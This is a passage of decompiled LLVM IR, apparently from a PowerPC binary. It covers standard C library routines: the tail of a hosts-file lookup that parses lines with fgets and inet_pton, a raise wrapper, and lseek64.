  %v1_1000a854 = add i32 %v0_1000a84c, 4
  %v2_1000a854 = inttoptr i32 %v1_1000a854 to i32*
  %v3_1000a854 = load i32, i32* %v2_1000a854, align 4
  store i32 %v3_1000a854, i32* %r0.global-to-local, align 4
  %v0_1000a858 = load i32, i32* %r19.global-to-local, align 4
  %v1_1000a858 = load i32, i32* @r28, align 4
  %v2_1000a858 = add i32 %v1_1000a858, 8
  %v3_1000a858 = inttoptr i32 %v2_1000a858 to i32*
  store i32 %v0_1000a858, i32* %v3_1000a858, align 4
  %v0_1000a85c = load i32, i32* @r23, align 4
  %v1_1000a85c = load i32, i32* @r28, align 4
  %v2_1000a85c = add i32 %v1_1000a85c, 16
  %v3_1000a85c = inttoptr i32 %v2_1000a85c to i32*
  store i32 %v0_1000a85c, i32* %v3_1000a85c, align 4
  %v0_1000a860 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a860 = load i32, i32* @r28, align 4
  %v2_1000a860 = inttoptr i32 %v1_1000a860 to i32*
  store i32 %v0_1000a860, i32* %v2_1000a860, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000a868 = load i32, i32* @r28, align 4
  %v2_1000a868 = add i32 %v1_1000a868, 12
  %v3_1000a868 = inttoptr i32 %v2_1000a868 to i32*
  store i32 16, i32* %v3_1000a868, align 4
  br label %dec_label_pc_1000a86c

dec_label_pc_1000a86c:                            ; preds = %dec_label_pc_1000a810, %dec_label_pc_1000a840
  %v0_1000a86c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a86c = load i32, i32* @r28, align 4
  %v2_1000a86c = add i32 %v1_1000a86c, 4
  %v3_1000a86c = inttoptr i32 %v2_1000a86c to i32*
  store i32 %v0_1000a86c, i32* %v3_1000a86c, align 4
  %v0_1000a870 = load i32, i32* @r28, align 4
  %v1_1000a870 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000a870 = inttoptr i32 %v1_1000a870 to i32*
  store i32 %v0_1000a870, i32* %v2_1000a870, align 4
  br label %dec_label_pc_1000aa08

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a770
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000a888

dec_label_pc_1000a888:                            ; preds = %dec_label_pc_1000a7e8, %dec_label_pc_1000a878
  %v1_1000a890 = phi i32 [ %v1_1000a890.pre, %dec_label_pc_1000a7e8 ], [ %arg8, %dec_label_pc_1000a878 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000a890 = inttoptr i32 %v1_1000a890 to i32*
  store i32 1, i32* %v2_1000a890, align 4
  br label %dec_label_pc_1000a9f0

dec_label_pc_1000a898:                            ; preds = %dec_label_pc_1000a9f0
  %v0_1000a898 = load i32, i32* @r24, align 4
  store i32 %v0_1000a898, i32* @r3, align 4
  store i32 268478628, i32* @lr, align 4
  %v2_1000a8a0 = call i32 @__GI_strchr(i32 %v0_1000a898, i32 35)
  %v4_1000a8a4 = icmp eq i32 %v2_1000a8a0, 0
  br i1 %v4_1000a8a4, label %dec_label_pc_1000a8b4, label %dec_label_pc_1000a8ac

dec_label_pc_1000a8ac:                            ; preds = %dec_label_pc_1000a898
  %v3_1000a8a0 = inttoptr i32 %v2_1000a8a0 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000a8a0, align 1
  br label %dec_label_pc_1000a8b4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a898, %dec_label_pc_1000a8ac
  %v0_1000a8b4 = load i32, i32* @r24, align 4
  store i32 %v0_1000a8b4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000a93017 = inttoptr i32 %v0_1000a8b4 to i8*
  %v2_1000a93018 = load i8, i8* %v1_1000a93017, align 1
  %v3_1000a93019 = zext i8 %v2_1000a93018 to i32
  store i32 %v3_1000a93019, i32* %r0.global-to-local, align 4
  %v3_1000a93421 = icmp eq i8 %v2_1000a93018, 0
  br i1 %v3_1000a93421, label %dec_label_pc_1000a93c, label %dec_label_pc_1000a8cc.preheader

dec_label_pc_1000a8c0:                            ; preds = %dec_label_pc_1000a8dc
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000a8c4 = inttoptr i32 %v0_1000a900 to i8*
  store i8 0, i8* %v3_1000a8c4, align 1
  %v0_1000a8c8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a8c8 = add i32 %v0_1000a8c8, 1
  store i32 %v1_1000a8c8, i32* %r11.global-to-local, align 4
  %v1_1000a8cc = inttoptr i32 %v1_1000a8c8 to i8*
  %v2_1000a8cc = load i8, i8* %v1_1000a8cc, align 1
  %v3_1000a8cc = zext i8 %v2_1000a8cc to i32
  store i32 %v3_1000a8cc, i32* %r0.global-to-local, align 4
  %v3_1000a8d0 = icmp eq i8 %v2_1000a8cc, 0
  br i1 %v3_1000a8d0, label %dec_label_pc_1000a93c, label %dec_label_pc_1000a8dc

dec_label_pc_1000a8dc:                            ; preds = %dec_label_pc_1000a8cc.preheader, %dec_label_pc_1000a8c0
  %v0_1000a900 = phi i32 [ %v1_1000a8c8, %dec_label_pc_1000a8c0 ], [ %v0_1000a8cc2, %dec_label_pc_1000a8cc.preheader ]
  %v0_1000a8e4.in = phi i32 [ %v3_1000a8cc, %dec_label_pc_1000a8c0 ], [ %v3_1000a8cc5, %dec_label_pc_1000a8cc.preheader ]
  %v0_1000a8e4 = mul nuw nsw i32 %v0_1000a8e4.in, 2
  %v3_1000a8e0 = load i32, i32* @global_var_1001d818, align 4
  store i32 %v3_1000a8e0, i32* %r9.global-to-local, align 4
  %v2_1000a8e4 = add i32 %v3_1000a8e0, %v0_1000a8e4
  %v3_1000a8e4 = inttoptr i32 %v2_1000a8e4 to i16*
  %v4_1000a8e4 = load i16, i16* %v3_1000a8e4, align 2
  %v5_1000a8e4 = zext i16 %v4_1000a8e4 to i32
  store i32 %v5_1000a8e4, i32* %r0.global-to-local, align 4
  %v1_1000a8e8 = and i32 %v5_1000a8e4, 32
  store i32 %v1_1000a8e8, i32* %r9.global-to-local, align 4
  %v3_1000a8e8 = icmp eq i32 %v1_1000a8e8, 0
  br i1 %v3_1000a8e8, label %dec_label_pc_1000a8f0, label %dec_label_pc_1000a8c0

dec_label_pc_1000a8f0:                            ; preds = %dec_label_pc_1000a8dc
  %v0_1000a8f0 = load i32, i32* @r29, align 4
  %v2_1000a8f0 = icmp sgt i32 %v0_1000a8f0, 6
  br i1 %v2_1000a8f0, label %dec_label_pc_1000a90c.preheader, label %dec_label_pc_1000a8f8

dec_label_pc_1000a8f8:                            ; preds = %dec_label_pc_1000a8f0
  %v1_1000a8f8 = mul i32 %v0_1000a8f0, 4
  store i32 %v1_1000a8f8, i32* %r0.global-to-local, align 4
  %v1_1000a8fc = add i32 %v0_1000a8f0, 1
  store i32 %v1_1000a8fc, i32* @r29, align 4
  %v1_1000a900 = load i32, i32* @r30, align 4
  %v3_1000a900 = add i32 %v1_1000a900, %v1_1000a8f8
  %v4_1000a900 = inttoptr i32 %v3_1000a900 to i32*
  store i32 %v0_1000a900, i32* %v4_1000a900, align 4
  %v0_1000a90c9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000a90c.preheader

dec_label_pc_1000a90c.preheader:                  ; preds = %dec_label_pc_1000a8f8, %dec_label_pc_1000a8f0
  %v0_1000a90c9 = phi i32 [ %v0_1000a90c9.pre, %dec_label_pc_1000a8f8 ], [ %v0_1000a900, %dec_label_pc_1000a8f0 ]
  %v1_1000a90c10 = inttoptr i32 %v0_1000a90c9 to i8*
  %v2_1000a90c11 = load i8, i8* %v1_1000a90c10, align 1
  %v3_1000a90c12 = zext i8 %v2_1000a90c11 to i32
  store i32 %v3_1000a90c12, i32* %r0.global-to-local, align 4
  %v3_1000a91014 = icmp eq i8 %v2_1000a90c11, 0
  br i1 %v3_1000a91014, label %dec_label_pc_1000a930.loopexit, label %dec_label_pc_1000a91c.lr.ph

dec_label_pc_1000a91c.lr.ph:                      ; preds = %dec_label_pc_1000a90c.preheader
  %v3_1000a920.pre = load i32, i32* @global_var_1001d818, align 4
  br label %dec_label_pc_1000a91c

dec_label_pc_1000a908:                            ; preds = %dec_label_pc_1000a91c
  %v1_1000a908 = add i32 %v0_1000a908, 1
  store i32 %v1_1000a908, i32* %r11.global-to-local, align 4
  %v1_1000a90c = inttoptr i32 %v1_1000a908 to i8*
  %v2_1000a90c = load i8, i8* %v1_1000a90c, align 1
  %v3_1000a90c = zext i8 %v2_1000a90c to i32
  store i32 %v3_1000a90c, i32* %r0.global-to-local, align 4
  %v3_1000a910 = icmp eq i8 %v2_1000a90c, 0
  br i1 %v3_1000a910, label %dec_label_pc_1000a930.loopexit, label %dec_label_pc_1000a91c

dec_label_pc_1000a91c:                            ; preds = %dec_label_pc_1000a91c.lr.ph, %dec_label_pc_1000a908
  %v0_1000a908 = phi i32 [ %v0_1000a90c9, %dec_label_pc_1000a91c.lr.ph ], [ %v1_1000a908, %dec_label_pc_1000a908 ]
  %v0_1000a924.in = phi i32 [ %v3_1000a90c12, %dec_label_pc_1000a91c.lr.ph ], [ %v3_1000a90c, %dec_label_pc_1000a908 ]
  %v0_1000a924 = mul nuw nsw i32 %v0_1000a924.in, 2
  store i32 %v3_1000a920.pre, i32* %r9.global-to-local, align 4
  %v2_1000a924 = add i32 %v0_1000a924, %v3_1000a920.pre
  %v3_1000a924 = inttoptr i32 %v2_1000a924 to i16*
  %v4_1000a924 = load i16, i16* %v3_1000a924, align 2
  %v5_1000a924 = zext i16 %v4_1000a924 to i32
  store i32 %v5_1000a924, i32* %r0.global-to-local, align 4
  %v1_1000a928 = and i32 %v5_1000a924, 32
  store i32 %v1_1000a928, i32* %r9.global-to-local, align 4
  %v3_1000a928 = icmp eq i32 %v1_1000a928, 0
  br i1 %v3_1000a928, label %dec_label_pc_1000a908, label %dec_label_pc_1000a930.loopexit

dec_label_pc_1000a930.loopexit:                   ; preds = %dec_label_pc_1000a91c, %dec_label_pc_1000a908, %dec_label_pc_1000a90c.preheader
  %v0_1000a930 = phi i32 [ %v0_1000a90c9, %dec_label_pc_1000a90c.preheader ], [ %v0_1000a908, %dec_label_pc_1000a91c ], [ %v1_1000a908, %dec_label_pc_1000a908 ]
  %v1_1000a930 = inttoptr i32 %v0_1000a930 to i8*
  %v2_1000a930 = load i8, i8* %v1_1000a930, align 1
  %v3_1000a930 = zext i8 %v2_1000a930 to i32
  store i32 %v3_1000a930, i32* %r0.global-to-local, align 4
  %v3_1000a934 = icmp eq i8 %v2_1000a930, 0
  br i1 %v3_1000a934, label %dec_label_pc_1000a93c, label %dec_label_pc_1000a8cc.preheader

dec_label_pc_1000a8cc.preheader:                  ; preds = %dec_label_pc_1000a8b4, %dec_label_pc_1000a930.loopexit
  %v0_1000a8cc2 = phi i32 [ %v0_1000a930, %dec_label_pc_1000a930.loopexit ], [ %v0_1000a8b4, %dec_label_pc_1000a8b4 ]
  %v1_1000a8cc3 = inttoptr i32 %v0_1000a8cc2 to i8*
  %v2_1000a8cc4 = load i8, i8* %v1_1000a8cc3, align 1
  %v3_1000a8cc5 = zext i8 %v2_1000a8cc4 to i32
  store i32 %v3_1000a8cc5, i32* %r0.global-to-local, align 4
  %v3_1000a8d07 = icmp eq i8 %v2_1000a8cc4, 0
  br i1 %v3_1000a8d07, label %dec_label_pc_1000a93c, label %dec_label_pc_1000a8dc

dec_label_pc_1000a93c:                            ; preds = %dec_label_pc_1000a930.loopexit, %dec_label_pc_1000a8cc.preheader, %dec_label_pc_1000a8c0, %dec_label_pc_1000a8b4
  %v0_1000a93c = load i32, i32* @r29, align 4
  %v1_1000a940 = mul i32 %v0_1000a93c, 4
  store i32 %v1_1000a940, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a948 = load i32, i32* @r30, align 4
  %v3_1000a948 = add i32 %v2_1000a948, %v1_1000a940
  %v4_1000a948 = inttoptr i32 %v3_1000a948 to i32*
  store i32 0, i32* %v4_1000a948, align 4
  %tmp55 = icmp slt i32 %v0_1000a93c, 2
  br i1 %tmp55, label %dec_label_pc_1000a9f0, label %dec_label_pc_1000a950

dec_label_pc_1000a950:                            ; preds = %dec_label_pc_1000a93c
  %v0_1000a950 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000a950 = icmp eq i32 %v0_1000a950, 1
  br i1 %v3_1000a950, label %dec_label_pc_1000aa08, label %dec_label_pc_1000a958

dec_label_pc_1000a958:                            ; preds = %dec_label_pc_1000a950
  %v3_1000a958 = icmp eq i32 %v0_1000a950, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_1000a958, label %dec_label_pc_1000a964, label %dec_label_pc_1000a990.preheader

dec_label_pc_1000a990.preheader:                  ; preds = %dec_label_pc_1000a958
  %v1_1000a99023 = load i32, i32* @r29, align 4
  %v2_1000a99024 = icmp sgt i32 %v1_1000a99023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000a99829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000a99829, i32* @r3, align 4
  br i1 %v2_1000a99024, label %dec_label_pc_1000a97c, label %dec_label_pc_1000a9a0

dec_label_pc_1000a964:                            ; preds = %dec_label_pc_1000a958
  %v0_1000a964 = load i32, i32* @r30, align 4
  %v1_1000a964 = inttoptr i32 %v0_1000a964 to i32*
  %v2_1000a964 = load i32, i32* %v1_1000a964, align 4
  store i32 %v2_1000a964, i32* @r4, align 4
  %v0_1000a968 = load i32, i32* %r15.global-to-local, align 4
  %v2_1000a96c = inttoptr i32 %v0_1000a968 to i8*
  %v3_1000a96c = call i32 @__GI_strcoll(i8* %v2_1000a96c, i32 %v2_1000a964)
  %v3_1000a970 = icmp eq i32 %v3_1000a96c, 0
  br i1 %v3_1000a970, label %dec_label_pc_1000a9a8, label %dec_label_pc_1000a9f0

dec_label_pc_1000a97c:                            ; preds = %dec_label_pc_1000a990.preheader, %dec_label_pc_1000a98c
  %v1_1000a97c = phi i32 [ %v1_1000a994, %dec_label_pc_1000a98c ], [ 4, %dec_label_pc_1000a990.preheader ]
  %v0_1000a99831 = phi i32 [ %v0_1000a998, %dec_label_pc_1000a98c ], [ %v0_1000a99829, %dec_label_pc_1000a990.preheader ]
  %v0_1000a97c = load i32, i32* @r30, align 4
  %v2_1000a97c = add i32 %v0_1000a97c, %v1_1000a97c
  %v3_1000a97c = inttoptr i32 %v2_1000a97c to i32*
  %v4_1000a97c = load i32, i32* %v3_1000a97c, align 4
  store i32 %v4_1000a97c, i32* @r4, align 4
  %v2_1000a980 = call i32 @__GI_strcasecmp(i32 %v0_1000a99831, i32 %v4_1000a97c)
  %v3_1000a984 = icmp eq i32 %v2_1000a980, 0
  %v0_1000a9a0.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000a984, label %dec_label_pc_1000a97c.dec_label_pc_1000a9a0_crit_edge, label %dec_label_pc_1000a98c

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a97c
  %v1_1000a98c = add i32 %v0_1000a9a0.pre, 1
  store i32 %v1_1000a98c, i32* @r31, align 4
  %v1_1000a990 = load i32, i32* @r29, align 4
  %v2_1000a990 = icmp slt i32 %v1_1000a98c, %v1_1000a990
  %v1_1000a994 = mul i32 %v1_1000a98c, 4
  store i32 %v1_1000a994, i32* %r0.global-to-local, align 4
  %v0_1000a998 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1000a998, i32* @r3, align 4
  br i1 %v2_1000a990, label %dec_label_pc_1000a97c, label %dec_label_pc_1000a9a0

dec_label_pc_1000a97c.dec_label_pc_1000a9a0_crit_edge: ; preds = %dec_label_pc_1000a97c
  %v1_1000a9a0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000a9a0

dec_label_pc_1000a9a0:                            ; preds = %dec_label_pc_1000a98c, %dec_label_pc_1000a97c.dec_label_pc_1000a9a0_crit_edge, %dec_label_pc_1000a990.preheader
  %v1_1000a9a0 = phi i32 [ %v1_1000a9a0.pre, %dec_label_pc_1000a97c.dec_label_pc_1000a9a0_crit_edge ], [ %v1_1000a99023, %dec_label_pc_1000a990.preheader ], [ %v1_1000a990, %dec_label_pc_1000a98c ]
  %v0_1000a9a0 = phi i32 [ %v0_1000a9a0.pre, %dec_label_pc_1000a97c.dec_label_pc_1000a9a0_crit_edge ], [ 1, %dec_label_pc_1000a990.preheader ], [ %v1_1000a98c, %dec_label_pc_1000a98c ]
  %v2_1000a9a0 = icmp slt i32 %v0_1000a9a0, %v1_1000a9a0
  br i1 %v2_1000a9a0, label %dec_label_pc_1000a9a8, label %dec_label_pc_1000a9f0

dec_label_pc_1000a9a8:                            ; preds = %dec_label_pc_1000a964, %dec_label_pc_1000a9a0
  %v0_1000a9a8 = load i32, i32* %r19.global-to-local, align 4
  %v3_1000a9a8 = icmp eq i32 %v0_1000a9a8, 2
  br i1 %v3_1000a9a8, label %dec_label_pc_1000a9b0, label %dec_label_pc_1000a9cc

dec_label_pc_1000a9b0:                            ; preds = %dec_label_pc_1000a9a8
  %v0_1000a9b0 = load i32, i32* @r30, align 4
  %v1_1000a9b0 = inttoptr i32 %v0_1000a9b0 to i32*
  %v2_1000a9b0 = load i32, i32* %v1_1000a9b0, align 4
  %v0_1000a9b8 = load i32, i32* @r25, align 4
  store i32 268478912, i32* @lr, align 4
  %v3_1000a9bc = inttoptr i32 %v2_1000a9b0 to i8*
  %v4_1000a9bc = call i32 @inet_pton(i32 2, i8* %v3_1000a9bc, i32 %v0_1000a9b8)
  %v2_1000a9c0 = icmp sgt i32 %v4_1000a9bc, 0
  br i1 %v2_1000a9c0, label %dec_label_pc_1000a810, label %dec_label_pc_1000a9ec

dec_label_pc_1000a9cc:                            ; preds = %dec_label_pc_1000a9a8
  %v3_1000a9cc = icmp eq i32 %v0_1000a9a8, 10
  br i1 %v3_1000a9cc, label %dec_label_pc_1000a9d4, label %dec_label_pc_1000a9ec

dec_label_pc_1000a9d4:                            ; preds = %dec_label_pc_1000a9cc
  %v0_1000a9d4 = load i32, i32* @r30, align 4
  %v1_1000a9d4 = inttoptr i32 %v0_1000a9d4 to i32*
  %v2_1000a9d4 = load i32, i32* %v1_1000a9d4, align 4
  %v0_1000a9dc = load i32, i32* %r21.global-to-local, align 4
  store i32 268478948, i32* @lr, align 4
  %v3_1000a9e0 = inttoptr i32 %v2_1000a9d4 to i8*
  %v4_1000a9e0 = call i32 @inet_pton(i32 10, i8* %v3_1000a9e0, i32 %v0_1000a9dc)
  %v2_1000a9e4 = icmp sgt i32 %v4_1000a9e0, 0
  br i1 %v2_1000a9e4, label %dec_label_pc_1000a840, label %dec_label_pc_1000a9ec

dec_label_pc_1000a9ec:                            ; preds = %dec_label_pc_1000a9b0, %dec_label_pc_1000a9cc, %dec_label_pc_1000a9d4
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_1000a9f0

dec_label_pc_1000a9f0:                            ; preds = %dec_label_pc_1000a9a0, %dec_label_pc_1000a964, %dec_label_pc_1000a93c, %dec_label_pc_1000a9ec, %dec_label_pc_1000a888
  %v0_1000a9f0 = load i32, i32* @r24, align 4
  %v0_1000a9f4 = load i32, i32* @r27, align 4
  %v0_1000a9f8 = load i32, i32* @r20, align 4
  store i32 268478976, i32* @lr, align 4
  %v3_1000a9fc = call i32 @fgets(i32 %v0_1000a9f0, i32 %v0_1000a9f4, i32 %v0_1000a9f8)
  %v3_1000aa00 = icmp eq i32 %v3_1000a9fc, 0
  br i1 %v3_1000aa00, label %dec_label_pc_1000aa08, label %dec_label_pc_1000a898

dec_label_pc_1000aa08:                            ; preds = %dec_label_pc_1000a9f0, %dec_label_pc_1000a950, %dec_label_pc_1000a86c
  %v0_1000aa08 = load i32, i32* %r18.global-to-local, align 4
  %v3_1000aa08 = icmp eq i32 %v0_1000aa08, 1
  br i1 %v3_1000aa08, label %dec_label_pc_1000aa20, label %dec_label_pc_1000aa10

dec_label_pc_1000aa10:                            ; preds = %dec_label_pc_1000aa08
  %v0_1000aa10 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_1000aa18.484 to i32), i32* @lr, align 4
  %v1_1000aa14 = inttoptr i32 %v0_1000aa10 to i16*
  %v2_1000aa14 = call i32 @__GI_fclose(i16* %v1_1000aa14)
  br label %dec_label_pc_1000aa20

dec_label_pc_1000aa1c:                            ; preds = %dec_label_pc_1000a7d4, %dec_label_pc_1000a7a4, %dec_label_pc_1000a79c, %dec_label_pc_1000a790, %dec_label_pc_1000a780, %dec_label_pc_1000a768, %dec_label_pc_1000a758
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_1000aa20

dec_label_pc_1000aa20:                            ; preds = %dec_label_pc_1000aa08, %dec_label_pc_1000aa10, %dec_label_pc_1000a800, %dec_label_pc_1000aa1c
  store i32 %v0_1000a720, i32* %r0.global-to-local, align 4
  %v0_1000aa24 = load i32, i32* @r26, align 4
  ret i32 %v0_1000aa24

; uselistorder directives
  uselistorder i32 %v0_1000a998, { 1, 0 }
  uselistorder i32 %v1_1000a98c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000a940, { 1, 0 }
  uselistorder i32 %v0_1000a93c, { 1, 0 }
  uselistorder i32 %v3_1000a8cc5, { 1, 0 }
  uselistorder i32 %v0_1000a8cc2, { 1, 0 }
  uselistorder i32 %v1_1000a8f8, { 1, 0 }
  uselistorder i32 %v0_1000a8f0, { 1, 0, 2 }
  uselistorder i32 %v2_1000a8a0, { 1, 0 }
  uselistorder i32 %v0_1000a790, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000a768.pr, { 1, 0, 2 }
  uselistorder i32 %v1_1000a72c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 12, 0, 13, 29, 20, 14, 15, 30, 16, 17, 19, 18, 28, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 23, 24, 25, 26, 27 }
  uselistorder i32 34, { 3, 4, 8, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 (i16*)* @__GI_fclose, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 4, 3, 2 }
  uselistorder i32 10, { 8, 21, 22, 23, 24, 25, 26, 27, 16, 17, 13, 14, 15, 29, 28, 30, 31, 4, 32, 2, 33, 3, 34, 1, 5, 9, 37, 10, 19, 11, 20, 18, 6, 35, 36, 12, 0, 7 }
  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 1, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 6, { 16, 17, 18, 19, 20, 0, 1, 2, 12, 13, 14, 15, 6, 7, 8, 3, 21, 22, 4, 23, 9, 24, 5, 10, 11 }
  uselistorder i32* @global_var_1001d818, { 0, 3, 1, 4, 5, 2, 6 }
  uselistorder i32 12, { 25, 26, 27, 0, 28, 29, 30, 11, 14, 31, 32, 8, 9, 10, 12, 33, 46, 47, 48, 49, 50, 51, 52, 53, 5, 6, 54, 55, 56, 59, 15, 17, 24, 16, 37, 38, 39, 40, 4, 18, 36, 1, 2, 7, 19, 3, 13, 41, 42, 43, 44, 60, 57, 58, 34, 35, 20, 21, 22, 23, 45 }
  uselistorder i32 80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 48, { 12, 7, 8, 9, 1, 10, 11, 4, 14, 15, 2, 16, 17, 18, 6, 19, 5, 20, 3, 0, 21, 22, 13 }
  uselistorder i32 16, { 5, 19, 20, 21, 6, 22, 23, 0, 24, 25, 1, 26, 7, 27, 28, 44, 45, 29, 39, 40, 30, 31, 32, 33, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 66, 59, 3, 17, 12, 14, 13, 41, 42, 70, 71, 72, 34, 35, 60, 61, 62, 63, 64, 65, 67, 68, 69, 36, 37, 38, 2, 8, 15, 16, 4, 9, 18, 10, 11, 43 }
  uselistorder i32* @r27, { 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 11, 12, 6, 13, 3, 2, 24, 25, 26, 27, 32, 0, 33, 34, 35, 36, 44, 45, 46, 47, 48, 49, 56, 57, 80, 4, 81, 82, 87, 50, 51, 52, 53, 54, 55, 83, 84, 85, 58, 59, 37, 38, 39, 60, 61, 5, 62, 63, 64, 65, 66, 7, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 8, 9, 10, 86, 40, 41, 42, 43, 78, 79, 28, 29, 30, 31 }
  uselistorder i32 32, { 28, 29, 30, 20, 31, 32, 21, 17, 18, 25, 1, 2, 3, 13, 37, 38, 39, 14, 19, 40, 41, 15, 16, 26, 27, 12, 35, 33, 34, 42, 43, 22, 44, 45, 46, 47, 48, 49, 50, 0, 51, 52, 36, 5, 6, 4, 8, 7, 23, 24, 10, 11, 9 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000aa20, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a9f0, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_1000a9ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a9a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a9a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a97c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a93c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000a8cc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000a91c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a888, { 1, 0 }
  uselistorder label %dec_label_pc_1000a86c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a768, { 1, 0 }
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000aa3c = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r29, align 4
  store i32 268479056, i32* @lr, align 4
  %v0_1000aa4c = call i32 @__libc_getpid()
  %v0_1000aa54 = load i32, i32* @r29, align 4
  store i32 %v0_1000aa3c, i32* @lr, align 4
  %v2_1000aa64 = call i32 @kill(i32 %v0_1000aa4c, i32 %v0_1000aa54)
  ret i32 %v2_1000aa64

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000aa6c = load i32, i32* @lr, align 4
  store i32 140, i32* %r0.global-to-local, align 4
  %v0_1000aa94 = call i32 @__asm_mfcr()
  %v1_1000aa98 = and i32 %v0_1000aa94, 268435456
  %v3_1000aa98 = icmp eq i32 %v1_1000aa98, 0
  store i32 %v0_1000aa94, i32* %r31.global-to-local, align 4
  store i32 %v0_1000aa94, i32* %r0.global-to-local, align 4
  br i1 %v3_1000aa98, label %dec_label_pc_1000aabc, label %dec_label_pc_1000aaac

dec_label_pc_1000aaac:                            ; preds = %entry
  %v0_1000aaac = call i32 @__errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1000aab4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000aab4 = inttoptr i32 %v0_1000aaac to i32*
  store i32 %v0_1000aab4, i32* %v2_1000aab4, align 4
  %v0_1000aac0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000aac0

dec_label_pc_1000aabc:                            ; preds = %entry
  %v3_1000aaa4 = icmp eq i32 %v0_1000aa94, 0
  br i1 %v3_1000aaa4, label %dec_label_pc_1000aacc, label %dec_label_pc_1000aac0

dec_label_pc_1000aac0:                            ; preds = %dec_label_pc_1000aabc, %dec_label_pc_1000aaac
  %v0_1000aac0 = phi i32 [ %v0_1000aa94, %dec_label_pc_1000aabc ], [ %v0_1000aac0.pre, %dec_label_pc_1000aaac ]
  %tmp = icmp slt i32 %v0_1000aac0, 0
  %v1_1000aac4 = zext i1 %tmp to i32
  %v2_1000aac4 = ashr i32 %v0_1000aac0, 31
  %v3_1000aac4 = and i32 %v2_1000aac4, -2
  %v4_1000aac4 = or i32 %v3_1000aac4, %v1_1000aac4
  br label %dec_label_pc_1000aad4

dec_label_pc_1000aacc:                            ; preds = %dec_label_pc_1000aabc
  %v3_1000aacc = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000aad4

dec_label_pc_1000aad4:                            ; preds = %dec_label_pc_1000aac0, %dec_label_pc_1000aacc
  %v0_1000aae4 = phi i32 [ %v4_1000aac4, %dec_label_pc_1000aac0 ], [ %v3_1000aacc, %dec_label_pc_1000aacc ]
  store i32 %v0_1000aa6c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000aae4

; uselistorder directives
  uselistorder i32 %v0_1000aac0, { 1, 0 }
  uselistorder i32 %v0_1000aa94, { 0, 3, 2, 1, 4 }
